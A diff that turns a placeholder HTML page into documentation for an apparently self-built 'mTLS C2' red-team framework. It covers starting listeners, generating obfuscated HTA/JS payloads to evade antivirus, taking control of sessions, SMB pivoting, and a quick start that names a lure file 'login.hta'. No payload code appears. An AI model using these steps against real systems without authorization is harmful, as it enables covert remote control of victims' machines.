@@ -1,14 +1,199 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>My First Webpage</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>mTLS C2 Docs</title>
+    <style>
+        :root {
+            --bg: #0d1117;
+            --sidebar-bg: #161b22;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --border: #30363d;
+            --code-bg: #000000;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            display: flex;
+        }
+
+        /* Sidebar Navigation */
+        nav {
+            width: 260px;
+            background-color: var(--sidebar-bg);
+            height: 100vh;
+            position: fixed;
+            border-right: 1px solid var(--border);
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        nav h2 { font-size: 1.2rem; color: #fff; margin-bottom: 20px; }
+        
+        nav ul { list-style: none; padding: 0; }
+        
+        nav ul li { margin: 12px 0; }
+        
+        nav ul li a {
+            text-decoration: none;
+            color: var(--text);
+            font-size: 0.95rem;
+            transition: color 0.2s;
+        }
+
+        nav ul li a:hover { color: var(--accent); }
+
+        /* Main Content */
+        main {
+            margin-left: 300px;
+            padding: 40px 60px;
+            max-width: 900px;
+            line-height: 1.6;
+        }
+
+        h1, h2, h3 { color: #fff; }
+        
+        .image-placeholder {
+            background: #21262d;
+            border: 1px dashed #484f58;
+            padding: 40px;
+            text-align: center;
+            border-radius: 6px;
+            margin: 20px 0;
+            color: #8b949e;
+        }
+
+        pre {
+            background: var(--code-bg);
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid var(--border);
+            overflow-x: auto;
+            color: #79c0ff;
+        }
+
+        code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        table th, table td {
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: left;
+        }
+
+        table th { background: #161b22; }
+
+        .disclaimer {
+            font-size: 0.85rem;
+            color: #8b949e;
+            border-top: 1px solid var(--border);
+            margin-top: 50px;
+            padding-top: 20px;
+        }
+    </style>
 </head>
 <body>
 
-    <h1>Welcome to My Website</h1>
-    <p>This is a simple paragraph of text.</p>
-    
-    <a href="https://www.google.com">This is a link to Google</a>
+<nav>
+    <h2>mTLS C2 Framework</h2>
+    <ul>
+        <li><a href="#intro">Introduction</a></li>
+        <li><a href="#listeners">Listeners</a></li>
+        <li><a href="#payloads">Generating Payloads</a></li>
+        <li><a href="#sessions">Managing Sessions</a></li>
+        <li><a href="#pivoting">Networking & Pivoting</a></li>
+        <li><a href="#quickstart">Quick Start</a></li>
+    </ul>
+</nav>
+
+<main>
+    <section id="intro">
+        <h1>Hey, welcome to the mTLS C2 Framework.</h1>
+        <p>This is a lightweight tool I built for red teaming. The focus here is simple: stay quiet and stay secure. By using <strong>Mutual TLS (mTLS)</strong>, we make sure that only your agents can talk to your server, and vice versa. No unauthorized scans or hijacking.</p>
+        
+        
+    </section>
+
+    <hr style="border: 0; border-top: 1px solid var(--border); margin: 40px 0;">
+
+    <section id="listeners">
+        <h2>1. Setting up Listeners</h2>
+        <p>Listeners are your entry points. You can spin up HTTP, HTTPS, or raw TCP. If you're going for stealth, HTTPS is your best friend because it looks like normal web traffic.</p>
+        
+        <table>
+            <thead>
+                <tr>
+                    <th>Command</th>
+                    <th>What it does</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>mtls list</code></td>
+                    <td>Shows you what's currently running.</td>
+                </tr>
+                <tr>
+                    <td><code>mtls &lt;type&gt; &lt;host&gt; &lt;port&gt;</code></td>
+                    <td>Starts a new listener.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        
+    </section>
+
+    <section id="payloads">
+        <h2>2. Generating Payloads</h2>
+        <p>The framework generates <strong>HTA</strong> or <strong>JS</strong> files. The cool part? You can use <code>--obfuscate</code> to mess with the code structure so it doesn't get flagged by signature-based AV.</p>
+        
+        <pre>generate 192.168.1.10 443 setup.hta --obfuscate --sleep 30 10</pre>
+
+        
+    </section>
+
+    <section id="sessions">
+        <h2>3. Managing Sessions</h2>
+        <p>Once your payload hits, the agent will check back in based on your jitter settings. You can jump in and out of sessions without losing your place.</p>
+        <ul>
+            <li><strong>sessions:</strong> See who's online.</li>
+            <li><strong>interact &lt;id&gt;:</strong> Take control.</li>
+            <li><strong>background:</strong> Head back to the main menu.</li>
+        </ul>
+
+        
+    </section>
+
+    <section id="pivoting">
+        <h2>4. Networking & Pivoting</h2>
+        <p>If you've hit a box that can't see the internet, you can use <strong>SMB daisy-chaining</strong>. This lets you tunnel traffic through a "beachhead" agent that <em>can</em> see you.</p>
+        
+        
+    </section>
+
+    <section id="quickstart">
+        <h2>Quick Start Summary</h2>
+        <p>If you just want to get moving, do this:</p>
+        <ol>
+            <li>Start your listener: <code>mtls https 192.168.1.10 443</code></li>
+            <li>Make your HTA: <code>generate 192.168.1.10 443 login.hta --obfuscate</code></li>
+            <li>Wait for the hit, then: <code>interact 1</code></li>
+        </ol>
+    </section>
+
+    <div class="disclaimer">
+        <p><strong>Heads up:</strong> Don't be a jerk. Use this for authorized testing only. If you use it for anything else, that's on you.</p>
+    </div>
+</main>
 
 </body>
 </html>
